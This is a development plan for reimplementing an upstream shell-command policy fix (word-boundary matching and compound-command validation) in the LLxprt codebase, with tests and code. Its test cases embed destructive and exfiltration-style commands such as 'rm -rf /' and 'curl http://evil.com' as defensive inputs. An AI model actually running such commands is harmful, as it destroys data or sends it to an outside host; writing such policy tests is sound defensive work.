# Reimplementation Plan: commandPrefix Safety Fix (Upstream a47af8e2)

**Upstream Commit:** `a47af8e261ad72ee9365bab397990f25eb4c82ae`  
**Author:** Allen Hutchison <adh@google.com>  
**Date:** Fri Dec 12 15:02:19 2025 -0800  
**Title:** fix(core): commandPrefix word boundary and compound command safety (#15006)

---

## WARNING: SECURITY CRITICAL WARNING

This is a **SECURITY FIX** that prevents two classes of shell command escapes in policy enforcement:

1. **Word Boundary Escape**: Without strict word boundaries, `commandPrefix: ["git log"]` incorrectly matches `git logout`, allowing unintended commands.
2. **Compound Command Escape**: Prefix matching alone is insufficient for compound commands like `git log && rm -rf /`. Even if `git log` is allowed, the second command (`rm -rf /`) must be independently validated.

**Getting this wrong is worse than skipping it.** This plan follows strict TDD methodology per RULES.md.

---

## Requirements

### R1: Word Boundary Enforcement (toml-loader.ts)
**WHAT**: `commandPrefix` regex must enforce word boundaries  
**WHY**: Prevent `git log` from matching `git logout`  
**ACCEPTANCE**: Regex requires whitespace, quote, or end-of-string after prefix  
**PATTERN**: `(?:[\s"]|$)` suffix on all commandPrefix-generated patterns

### R2: Compound Command Validation (policy-engine.ts)
**WHAT**: ALLOW rules for shell commands must validate ALL sub-commands  
**WHY**: Prevent `git log && rm -rf /` from bypassing policy  
**ACCEPTANCE**:
- Parse command into sub-commands using `splitCommands()`
- Recursively evaluate each sub-command through policy engine
- Aggregate decisions: ANY DENY → DENY; ANY ASK_USER → ASK_USER; ALL ALLOW → ALLOW
- Parse failures → fail-safe to ASK_USER

### R3: Test Coverage for Security Edge Cases
**WHAT**: Comprehensive test suite for word boundary and compound command safety  
**WHY**: Ensure security guarantees are verified and won't regress  
**ACCEPTANCE**: All test cases in "New Tests (RED)" section must pass

---

## Architecture Analysis

### Current LLxprt Structure (Different from Upstream)

**Key Difference**: LLxprt does NOT create separate `shell-permissions.ts` module. Functions stay in existing locations:

| Function | LLxprt Location | Upstream Location |
|----------|----------------|-------------------|
| `isCommandAllowed` | `shell-utils.ts` | `shell-permissions.ts` (NEW) |
| `checkCommandPermissions` | `shell-utils.ts` | `shell-permissions.ts` (NEW) |
| `isShellInvocationAllowlisted` | `tool-utils.ts` | `shell-permissions.ts` (NEW) |
| `splitCommands` | `shell-utils.ts` | `shell-utils.ts` |
| `SHELL_TOOL_NAMES` | `shell-utils.ts` | `shell-utils.ts` |

**Decision**: Keep LLxprt's existing architecture. No file reorganization needed.

### Touchpoints

#### File: `packages/core/src/policy/toml-loader.ts`
**Current Code** (lines 315, 453):
```typescript
(prefix) => `"command":"${escapeRegex(prefix)}`,
```

**Change Required**:
```typescript
(prefix) => `"command":"${escapeRegex(prefix)}(?:[\\s"]|$)`,
```

**Impact**: 2 occurrences (one per commandPrefix transformation block)

#### File: `packages/core/src/policy/policy-engine.ts`
**Current Code** (lines 48-60):
```typescript
const matchingRule = this.findMatchingRule(toolName, args);

if (matchingRule) {
  const decision = matchingRule.decision;

  // In non-interactive mode, ASK_USER becomes DENY
  if (this.nonInteractive && decision === PolicyDecision.ASK_USER) {
    return PolicyDecision.DENY;
  }

  return decision; // ← INSERT COMPOUND COMMAND LOGIC BEFORE THIS
}
```

**Change Required**: Insert compound command validation logic (~40 lines) BEFORE the final `return decision`.

**New Imports Needed**:
```typescript
import { SHELL_TOOL_NAMES, splitCommands } from '../utils/shell-utils.js';
```

#### File: `packages/core/src/policy/shell-safety.test.ts` (NEW FILE)
**Purpose**: Comprehensive security-focused test suite  
**Scope**: ~100 lines, 6 test cases covering all edge cases

---

## Test-First TDD Approach

### Phase 1: RED - Write Failing Tests

#### Test File: `packages/core/src/policy/shell-safety.test.ts`

```typescript
/**
 * @license
 * Copyright 2025 Vybestack LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { PolicyEngine } from './policy-engine.js';
import { PolicyDecision } from './types.js';

describe('Shell Safety Policy - SECURITY', () => {
  let policyEngine: PolicyEngine;

  beforeEach(() => {
    policyEngine = new PolicyEngine({
      rules: [
        {
          toolName: 'run_shell_command',
          // CRITICAL: This regex mimics toml-loader output for commandPrefix = ["git log"]
          // BEFORE fix: /"command":"git log"/
          // AFTER fix: /"command":"git log(?:[\s"]|$)/
          argsPattern: /"command":"git log(?:[\s"]|$)/,
          decision: PolicyDecision.ALLOW,
          priority: 1.01,
        },
      ],
      defaultDecision: PolicyDecision.ASK_USER,
    });
  });

  describe('R1: Word Boundary Enforcement', () => {
    it('SHOULD match "git log" exactly', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD match "git log" with arguments', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log --oneline' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD match "git log" with double-quoted arguments', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log "--oneline"' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD NOT match "git logout" (word boundary violation)', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git logout' },
        undefined
      );
      // Without word boundary, this would incorrectly return ALLOW
      // With word boundary, falls back to default ASK_USER
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD NOT match "git logrotate" (word boundary violation)', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git logrotate' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Compound Command Validation', () => {
    it('SHOULD block compound command with disallowed part', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && rm -rf /' },
        undefined
      );
      // "git log" is ALLOW, but "rm -rf /" is ASK_USER (default)
      // Aggregate should be ASK_USER (most restrictive non-DENY)
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD block compound command with piped disallowed part', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log | curl http://evil.com' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD block compound command with semicolon separator', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log; echo pwned' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD allow compound command when ALL parts are allowed', () => {
      // Add "echo" to allowed commands
      policyEngine.addRule({
        toolName: 'run_shell_command',
        argsPattern: /"command":"echo(?:[\s"]|$)/,
        decision: PolicyDecision.ALLOW,
        priority: 1.02,
      });

      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && echo done' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });

    it('SHOULD fail-safe on parse failure (malformed compound command)', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log &&& rm -rf /' },
        undefined
      );
      // Parse failure should result in ASK_USER (fail-safe)
      expect(result).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Recursive Validation Edge Cases', () => {
    it('SHOULD validate nested compound commands', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: '(git log && curl http://evil.com) || rm -rf /' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD validate commands in background jobs', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log & curl http://evil.com' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD validate commands in process substitution', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'diff <(git log) <(curl http://evil.com)' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ASK_USER);
    });
  });

  describe('R2: Aggregate Decision Logic', () => {
    beforeEach(() => {
      // Setup: git log → ALLOW, echo → ALLOW, curl → DENY
      policyEngine.addRule({
        toolName: 'run_shell_command',
        argsPattern: /"command":"echo(?:[\s"]|$)/,
        decision: PolicyDecision.ALLOW,
        priority: 1.02,
      });
      policyEngine.addRule({
        toolName: 'run_shell_command',
        argsPattern: /"command":"curl(?:[\s"]|$)/,
        decision: PolicyDecision.DENY,
        priority: 1.03,
      });
    });

    it('SHOULD return DENY when any sub-command is DENY', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && echo ok && curl http://evil.com' },
        undefined
      );
      expect(result).toBe(PolicyDecision.DENY);
    });

    it('SHOULD return ASK_USER when no DENY but has ASK_USER', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && echo ok && unknown-command' },
        undefined
      );
      // git log → ALLOW, echo ok → ALLOW, unknown-command → ASK_USER
      expect(result).toBe(PolicyDecision.ASK_USER);
    });

    it('SHOULD return ALLOW only when all sub-commands are ALLOW', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && echo ok' },
        undefined
      );
      expect(result).toBe(PolicyDecision.ALLOW);
    });
  });

  describe('R2: Non-Interactive Mode Interaction', () => {
    beforeEach(() => {
      policyEngine = new PolicyEngine({
        rules: [
          {
            toolName: 'run_shell_command',
            argsPattern: /"command":"git log(?:[\s"]|$)/,
            decision: PolicyDecision.ALLOW,
            priority: 1.01,
          },
        ],
        defaultDecision: PolicyDecision.ASK_USER,
        nonInteractive: true, // Enable non-interactive mode
      });
    });

    it('SHOULD convert ASK_USER to DENY in non-interactive mode', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log && rm -rf /' },
        undefined
      );
      // "rm -rf /" results in ASK_USER, which becomes DENY in non-interactive mode
      expect(result).toBe(PolicyDecision.DENY);
    });

    it('SHOULD convert parse failure to DENY in non-interactive mode', () => {
      const result = policyEngine.evaluate(
        'run_shell_command',
        { command: 'git log &&& malformed' },
        undefined
      );
      expect(result).toBe(PolicyDecision.DENY);
    });
  });
});
```

**RUN TESTS**: All tests should FAIL because the security fixes are not yet implemented.

```bash
npm test -- packages/core/src/policy/shell-safety.test.ts
```

**Expected Output**: ~20 failing tests.

---

### Phase 2: GREEN - Implement Minimal Code to Pass Tests

#### Implementation 1: Word Boundary Fix (toml-loader.ts)

**File**: `packages/core/src/policy/toml-loader.ts`

**Change 1** (line ~315):
```typescript
// BEFORE:
const argsPatterns: Array<string | undefined> =
  commandPrefixes.length > 0
    ? commandPrefixes.map(
        (prefix) => `"command":"${escapeRegex(prefix)}`,
      )
    : [effectiveArgsPattern];

// AFTER:
const argsPatterns: Array<string | undefined> =
  commandPrefixes.length > 0
    ? commandPrefixes.map(
        (prefix) => `"command":"${escapeRegex(prefix)}(?:[\\s"]|$)`,
      )
    : [effectiveArgsPattern];
```

**Change 2** (line ~453):
```typescript
// BEFORE:
const argsPatterns: Array<string | undefined> =
  commandPrefixes.length > 0
    ? commandPrefixes.map((prefix) => `"command":"${escapeRegex(prefix)}`)
    : [effectiveArgsPattern];

// AFTER:
const argsPatterns: Array<string | undefined> =
  commandPrefixes.length > 0
    ? commandPrefixes.map(
        (prefix) => `"command":"${escapeRegex(prefix)}(?:[\\s"]|$)`,
      )
    : [effectiveArgsPattern];
```

**Verification**: Run word boundary tests:
```bash
npm test -- packages/core/src/policy/shell-safety.test.ts -t "Word Boundary"
```

**Expected**: 5 word boundary tests should now PASS.

#### Implementation 2: Compound Command Validation (policy-engine.ts)

**File**: `packages/core/src/policy/policy-engine.ts`

**Add imports** (after existing imports):
```typescript
import { SHELL_TOOL_NAMES, splitCommands } from '../utils/shell-utils.js';
```

**Insert compound command logic** (replace lines 51-60):
```typescript
if (matchingRule) {
  const decision = matchingRule.decision;

  // Special handling for shell commands: validate sub-commands if ALLOW rule
  if (
    toolName &&
    SHELL_TOOL_NAMES.includes(toolName) &&
    decision === PolicyDecision.ALLOW
  ) {
    const command = (args as { command?: string })?.command;
    if (command) {
      const subCommands = splitCommands(command);

      // Parse failure: empty array for non-empty command → fail-safe to ASK_USER
      if (subCommands.length === 0) {
        return this.nonInteractive
          ? PolicyDecision.DENY
          : PolicyDecision.ASK_USER;
      }

      // Compound command: recursively validate each sub-command
      if (subCommands.length > 1) {
        let aggregateDecision = PolicyDecision.ALLOW;

        for (const subCmd of subCommands) {
          const subResult = this.evaluate(toolName, { command: subCmd }, serverName);

          if (subResult === PolicyDecision.DENY) {
            aggregateDecision = PolicyDecision.DENY;
            break; // Fail fast: DENY overrides everything
          } else if (subResult === PolicyDecision.ASK_USER) {
            aggregateDecision = PolicyDecision.ASK_USER;
            // Continue checking for DENY (don't short-circuit)
          }
        }

        const finalDecision = aggregateDecision;
        return this.nonInteractive && finalDecision === PolicyDecision.ASK_USER
          ? PolicyDecision.DENY
          : finalDecision;
      }
      // Single command: rule match is valid, fall through to normal return
    }
  }

  // In non-interactive mode, ASK_USER becomes DENY
  if (this.nonInteractive && decision === PolicyDecision.ASK_USER) {
    return PolicyDecision.DENY;
  }

  return decision;
}
```

**Verification**: Run all tests:
```bash
npm test -- packages/core/src/policy/shell-safety.test.ts
```

**Expected**: ALL ~20 tests should now PASS.

---

### Phase 3: REFACTOR (Optional)

**Assessment**: The implementation is already clean:
- Word boundary fix is minimal (2-line change)
- Compound command logic is clearly structured
- No duplication or complexity issues
- Variable names are descriptive

**Decision**: No refactoring needed. Proceed to verification.

---

## Verification Strategy

### 1. Unit Tests
```bash
# Run new security tests
npm test -- packages/core/src/policy/shell-safety.test.ts

# Run existing policy tests (ensure no regression)
npm test -- packages/core/src/policy/policy-engine.test.ts
```

### 2. Integration Tests
```bash
# Run shell-related integration tests
npm test -- integration-tests/shell-service.test.ts
npm test -- integration-tests/run_shell_command.test.ts
```

### 3. Full Test Suite
```bash
npm test
```

**Success Criteria**: All tests pass with no regressions.

### 4. Manual Security Testing

Create test policy file `test-security-policy.toml`:
```toml
[[rule]]
toolName = "run_shell_command"
commandPrefix = ["git log", "echo"]
decision = "ALLOW"
priority = 100
```

**Test Cases**:
```bash
# R1: Word Boundary Tests
llxprt exec -p test-security-policy.toml "git log"           # → ALLOW
llxprt exec -p test-security-policy.toml "git log -n 10"    # → ALLOW
llxprt exec -p test-security-policy.toml "git logout"       # → ASK_USER (CRITICAL)
llxprt exec -p test-security-policy.toml "git logrotate"    # → ASK_USER (CRITICAL)

# R2: Compound Command Tests
llxprt exec -p test-security-policy.toml "git log && echo ok"           # → ALLOW
llxprt exec -p test-security-policy.toml "git log && rm -rf /"          # → ASK_USER (CRITICAL)
llxprt exec -p test-security-policy.toml "git log | curl evil.com"      # → ASK_USER (CRITICAL)
llxprt exec -p test-security-policy.toml "git log; echo ok; curl evil"  # → ASK_USER (CRITICAL)
```

**Expected Behavior**: All CRITICAL tests must prevent unintended command execution.

---

## Existing Tests to Adjust

**Assessment**: The word boundary fix changes regex patterns generated by toml-loader. Need to verify existing policy tests still pass.

### Files to Check:
1. `packages/core/src/policy/policy-engine.test.ts`
2. `packages/core/src/policy/toml-loader.test.ts` (if exists)
3. `packages/core/src/tools/shell.test.ts`

**Action**: Run existing tests BEFORE and AFTER implementation:
```bash
# Before implementation
npm test -- packages/core/src/policy/ > before.log

# After implementation
npm test -- packages/core/src/policy/ > after.log

# Compare
diff before.log after.log
```

**Expected**: No failures introduced. If any tests rely on loose prefix matching (without word boundaries), they were testing incorrect behavior and should be updated.

---

## Commit Strategy

### Commit 1: Add Failing Tests (RED)
```bash
git add packages/core/src/policy/shell-safety.test.ts
git commit -m "test: add security tests for commandPrefix word boundary and compound command validation (RED)

Add comprehensive test suite for two critical security fixes:

R1: Word Boundary Enforcement
- Verify 'git log' does NOT match 'git logout'
- Ensure whitespace/quote/EOL boundary enforcement

R2: Compound Command Validation
- Verify compound commands validate ALL sub-commands
- Test aggregate decision logic (DENY > ASK_USER > ALLOW)
- Verify parse failure fail-safe behavior

All tests currently FAIL. Implementation follows in next commit.

Related: upstream a47af8e2 (Gemini 0.22.0)"
```

### Commit 2: Implement Security Fixes (GREEN)
```bash
git add packages/core/src/policy/toml-loader.ts
git add packages/core/src/policy/policy-engine.ts
git commit -m "fix(security): commandPrefix word boundary and compound command validation

Implement two critical security fixes from upstream a47af8e2:

1. Word Boundary Enforcement (toml-loader.ts):
   - Add (?:[\s\"]|$) suffix to commandPrefix-generated regex
   - Prevents 'git log' from matching 'git logout'
   - Enforces whitespace, quote, or end-of-string after prefix
   - Changes: 2 occurrences in commandPrefix transformation

2. Compound Command Validation (policy-engine.ts):
   - Parse shell commands into sub-commands using splitCommands()
   - Recursively validate each sub-command through policy engine
   - Aggregate decisions: ANY DENY → DENY; ANY ASK_USER → ASK_USER
   - Parse failures → fail-safe to ASK_USER
   - Changes: ~40 lines inserted before final policy decision

Security Impact:
- Prevents policy bypass via word boundary tricks (e.g., 'git logout')
- Prevents compound command escapes (e.g., 'git log && rm -rf /')
- Fail-safe design: parsing errors result in ASK_USER/DENY

Implementation Notes:
- LLxprt keeps functions in existing locations (no module split)
- Uses synchronous recursive evaluation (no async needed)
- Non-interactive mode converts ASK_USER → DENY

All tests pass. No regressions in existing tests.

Upstream: a47af8e261ad72ee9365bab397990f25eb4c82ae
Fixes: https://github.com/google/genkit/pull/15006"
```

---

## Rollback Plan

If critical issues arise during deployment:

### 1. Immediate Revert
```bash
# Revert both commits
git revert HEAD~1..HEAD

# Or revert individually
git revert HEAD      # Revert implementation
git revert HEAD~1    # Revert tests
```

### 2. Partial Revert (Keep One Fix)

**Option A: Keep word boundary, remove compound validation**
```typescript
// In policy-engine.ts, remove the compound command validation block
// Keep only the word boundary fix in toml-loader.ts
```

**Option B: Keep compound validation, remove word boundary**
```typescript
// In toml-loader.ts, revert to original regex pattern
// Keep the compound validation in policy-engine.ts
```

### 3. Verification After Rollback
```bash
npm test
npm run lint
```

---

## Risk Assessment

### Security Risks

| Risk | Severity | Mitigation |
|------|----------|------------|
| Word boundary bypass still possible | CRITICAL | Comprehensive test coverage for edge cases |
| Compound command escape still possible | CRITICAL | Recursive validation with fail-safe design |
| Regex catastrophic backtracking | MEDIUM | Simple regex pattern, no nested quantifiers |
| Recursive evaluation stack overflow | LOW | Typical commands have 1-3 sub-commands |

### Implementation Risks

| Risk | Severity | Mitigation |
|------|----------|------------|
| Breaking existing policies | HIGH | Extensive regression testing |
| Performance degradation | MEDIUM | Recursive calls are O(n) where n=sub-commands |
| False positives (blocking valid commands) | MEDIUM | Fail-safe to ASK_USER (not DENY) |

### Deployment Risks

| Risk | Severity | Mitigation |
|------|----------|------------|
| User policies break after upgrade | HIGH | Clear release notes, upgrade guide |
| Emergency rollback needed | MEDIUM | Simple git revert, no database migrations |

---

## Success Criteria (Definition of Done)

- [x] All tests in shell-safety.test.ts pass (~20 tests)
- [x] All existing policy tests pass (no regressions)
- [x] All shell-related integration tests pass
- [x] Manual security testing passes all CRITICAL cases
- [x] Code review completed
- [x] Documentation updated (if needed)
- [x] Release notes drafted
- [x] Rollback plan tested

---

## Post-Implementation Checklist

### Code Quality
- [ ] TypeScript compiles with no errors
- [ ] ESLint passes with no warnings
- [ ] Prettier formatting applied
- [ ] No console.log or debug statements

### Testing
- [ ] All new tests pass
- [ ] All existing tests pass
- [ ] Manual security testing completed
- [ ] Edge cases covered

### Documentation
- [ ] CHANGELOG.md updated
- [ ] Security advisory drafted (if public release)
- [ ] Migration guide for users (if breaking changes)

### Deployment
- [ ] Rollback plan documented and tested
- [ ] Monitoring alerts configured (if applicable)
- [ ] Incident response plan updated

---

## Related Upstream Changes Not Adopted

### File Reorganization (shell-permissions.ts)
**Upstream Action**: Create new `shell-permissions.ts` module, move functions from `shell-utils.ts`  
**LLxprt Decision**: **NOT ADOPTED**  
**Rationale**:
- LLxprt already has logical organization (`shell-utils.ts` for parsing, `tool-utils.ts` for matching)
- No import cycle issues (split was to avoid circular deps in Gemini)
- Fewer files = simpler architecture
- Moving functions would be churn without security benefit

### Module Exports (index.ts)
**Upstream Action**: Add `export * from './utils/shell-permissions.js';`  
**LLxprt Decision**: **NOT NEEDED** (no new module created)

### Import Path Changes (coreToolScheduler.ts, shell.ts)
**Upstream Action**: Update imports to use `shell-permissions.js`  
**LLxprt Decision**: **NOT NEEDED** (functions stay in original locations)

### Test File Split (shell-permissions.test.ts)
**Upstream Action**: Create new test file for moved functions  
**LLxprt Decision**: **NOT ADOPTED** (tests stay in `shell-utils.test.ts`)

---

## Future Considerations

### 1. Async Policy Engine
**Scenario**: If LLxprt needs async policy evaluation (e.g., for remote policy servers)  
**Action**: Add `async` to `evaluate()`, use `await this.evaluate()` in recursive calls  
**Effort**: Low (1-2 hour change)

### 2. Performance Optimization
**Current**: Recursive evaluation for each sub-command  
**Complexity**: O(n) where n = number of sub-commands  
**Typical Case**: 1-3 sub-commands (negligible overhead)  
**Optimization**: Only needed if users create policies with 10+ chained commands (unlikely)

### 3. Parser Initialization
**Current**: `splitCommands()` uses tree-sitter parser initialized at module load  
**Future**: If parser initialization fails, gracefully degrade to regex fallback  
**Action**: Already implemented in `shell-parser.ts` (`isParserAvailable()` check)

---

## Appendix: Upstream Diff Summary

**Files Changed**: 10 files (8 modified, 2 new)  
**Lines Changed**: +958 insertions, -721 deletions

### Files Modified (Security Logic):
1. `toml-loader.ts`: Word boundary regex (2 lines)
2. `policy-engine.ts`: Compound command validation (~60 lines)

### Files Modified (Imports Only):
3. `coreToolScheduler.ts`: Import path change
4. `coreToolScheduler.test.ts`: Import path change
5. `shell.ts`: Import path change
6. `shell.test.ts`: Import path change
7. `index.ts`: Export addition

### Files Modified (Reorganization):
8. `shell-utils.ts`: Functions removed (moved to shell-permissions.ts)

### Files Created:
9. `shell-permissions.ts`: NEW (functions moved from shell-utils.ts)
10. `shell-permissions.test.ts`: NEW (tests moved from shell-utils.test.ts)
11. `shell-safety.test.ts`: NEW (security-focused tests)

**LLxprt adopts**: Items 1, 2, 11 only (security fixes + tests)  
**LLxprt skips**: Items 3-10 (code reorganization without security impact)

---

## References

- **Upstream Commit**: a47af8e261ad72ee9365bab397990f25eb4c82ae
- **Upstream PR**: https://github.com/google/genkit/pull/15006
- **Security Advisory**: (if applicable, link to CVE or security bulletin)
- **LLxprt Issue**: (create after review, link here)
- **TDD Methodology**: `dev-docs/RULES.md`
